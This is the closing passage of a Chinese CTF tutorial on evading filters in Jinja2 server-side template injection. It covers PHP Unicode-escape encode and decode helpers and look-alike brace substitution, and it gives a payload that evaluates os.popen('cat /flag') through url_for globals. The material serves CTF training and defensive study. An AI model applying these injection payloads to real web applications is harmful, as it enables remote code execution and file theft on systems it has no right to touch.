      $arr = is_array($str) ? $str : str_split($str);//获取字符内部数组表示,此时$arr应类似array(228, 189, 160)
      foreach ($arr as $value)
      {
          $bin_str .= decbin(ord($value));//转成数字再转成二进制字符串,$bin_str应类似111001001011110110100000,如果是汉字"你"
      }
      $bin_str = preg_replace('/^.{4}(.{4}).{2}(.{6}).{2}(.{6})$/', '$1$2$3', $bin_str);//正则截取, $bin_str应类似0100111101100000,如果是汉字"你"
      $unicode = dechex(bindec($bin_str));//返回unicode十六进制
      $_sup = '';
      for ($i = 0; $i < 4 - strlen($unicode); $i++)
      {
          $_sup .= '0';//补位高字节 0
      }
      $str =  '\\u' . $_sup . $unicode; //加上 \u  返回
      $resUnicode .= $str;
  }
  return $resUnicode;
}
//Unicode编码转字符串方法1
function unicode_decode($name)
{
  // 转换编码，将Unicode编码转换成可以浏览的utf-8编码
  $pattern = '/([\w]+)|(\\\u([\w]{4}))/i';
  preg_match_all($pattern, $name, $matches);
  if (!empty($matches))
  {
    $name = '';
    for ($j = 0; $j < count($matches[0]); $j++)
    {
      $str = $matches[0][$j];
      if (strpos($str, '\\u') === 0)
      {
        $code = base_convert(substr($str, 2, 2), 16, 10);
        $code2 = base_convert(substr($str, 4), 16, 10);
        $c = chr($code).chr($code2);
        $c = iconv('UCS-2', 'UTF-8', $c);
        $name .= $c;
      }
      else
      {
        $name .= $str;
      }
    }
  }
  return $name;
}
//Unicode编码转字符串
function unicode_decode2($str){
  $json = '{"str":"' . $str . '"}';
  $arr = json_decode($json, true);
  if (empty($arr)) return '';
  return $arr['str'];
}
echo unicode_encode('__class__');
echo unicode_decode('\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f');
//\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f__class__
```

### 魔改字符

这种方法是在太湖杯 easyWeb 这道题目学到的，上面所说的过滤双大括号，在一些特定的题目可以魔改`{{}}`，比如说这道题由于有个字符规范器可以把我们输入的文本标准化，所以可以使用这种方法

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfP3o9TibDf1JBXWRqr32SuHiaeTiay7MARyDQYpAHx8LF72l72JO85Nhw780qSYIXonrcJQV7rOAUbQ/640?wx_fmt=png)

可以在 Unicode 字符网站寻找绕过的字符，直接在网址搜索`{`，就会出现类似的字符，就可以找到`︷`和`︸`了，网址：https://www.compart.com/en/unicode/U+FE38

payload 如下

```
︷︷config︸︸
%EF%B8%B7%EF%B8%B7config%EF%B8%B8%EF%B8%B8
```

还可以使用中文的字符魔改

```
｛ ｛
｝ ｝
［ ［
］ ］
＇ ＇
＂ ＂
```

payload 如下

```
｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝ 
```

总结
--

因为水平和文章篇幅有限，可能还有一些 bypass 方法没有提到，还有就是 CTF 中也不只考 Jinja2 这种模板，还有另外的 Twig 模板，smart 等模板，这些就等以后有必要再更吧，最后就是有不足之处请各位师傅指出

参考链接
----

```
https://p0sec.net/index.php/archives/120/
https://www.jianshu.com/p/a736e39c3510
https://www.redmango.top/article/43
https://xz.aliyun.com/t/8029
https://xz.aliyun.com/t/7746
```

**12/18**

欢迎投稿至邮箱：**EDU@antvsion.com**  

了解稿件投递相关

请点击公众号菜单：【来撩我吧】- 原创征集

有才能的你快来投稿吧！

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDH643dgKUQ7JK7bkJibUEk8bImjXrQgvtr4MZpMnfVuw7aT2KRkdFJrw/640?wx_fmt=gif)

快戳 “阅读原文” 做实验